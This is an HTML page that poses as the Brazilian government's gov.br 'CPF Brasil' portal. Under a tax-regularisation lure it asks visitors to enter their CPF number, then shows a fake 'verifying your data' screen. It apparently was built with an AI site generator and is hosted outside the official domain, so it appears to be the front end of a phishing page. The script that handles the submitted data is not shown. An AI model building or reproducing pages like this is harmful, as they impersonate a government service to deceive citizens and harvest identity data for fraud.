
<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>GOV.BR - CPF Brasil</title>
    <meta name="description" content="GOV.BR - CPF Brasil" />
    <meta name="author" content="GOV.BR" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <meta property="og:title" content="GOV.BR - CPF Brasil" />
    <meta property="og:description" content="Consulta de CPF e regularização fiscal" />
    <meta property="og:type" content="website" />
    <link rel="stylesheet" href="css/styles.css">
    <!-- IMPORTANT: DO NOT REMOVE THIS SCRIPT TAG OR THIS VERY COMMENT! -->
    <script src="https://cdn.gpteng.co/gptengineer.js" type="module"></script>
  </head>
  <body>
    <div id="root">
      <div class="govbr-bg">
        <div id="loading-screen" class="hidden">
          <div class="loading-container">
            <div class="spinner-large"></div>
            <p id="loading-message">Verificando seus dados...</p>
          </div>
        </div>
        
        <div id="main-form" class="govbr-card">
          <div class="flex justify-center mb-6">
            <img src="../lovable-uploads/d64f49fe-6769-45eb-afe4-b03e47c2f0d7.png" alt="Gov.br Logo" class="logo-img">
          </div>
          
          <div class="text-center mb-6">
            <h1 class="text-2xl font-bold mb-1">Bem-vindo ao CPF Brasil</h1>
            <p class="text-gray-600">do GOV.br</p>
          </div>
          
          <p class="text-sm text-center mb-6">
            Ao entrar, você concorda com nosso
            <a href="#" class="text-blue-600">
              Termo de Responsabilidade e Política de Privacidade
            </a>
          </p>
          
          <form id="cpf-form">
            <div class="mb-6">
              <label for="cpf" class="block mb-2 text-sm font-medium">
                Digite seu CPF para acessar
              </label>
              <div class="relative">
                <input 
                  type="text" 
                  id="cpf" 
                  class="input-field" 
                  placeholder="Digite apenas números"
                  maxlength="14"
                >
                <span id="cpf-error" class="error-message hidden">CPF inválido. Digite um CPF com 11 dígitos.</span>
              </div>
            </div>
            
            <button 
              type="submit" 
              class="govbr-btn"
              id="submit-btn"
            >
              <span id="btn-text">ENTRAR COM O GOV.BR</span>
              <span id="btn-loading" class="hidden"><span class="spinner"></span><span>PROCESSANDO...</span></span>
            </button>
          </form>
        </div>
      </div>
    </div>
    <div id="toast-container" class="toast-container"></div>
    <script src="js/script.js"></script>
  </body>
</html>
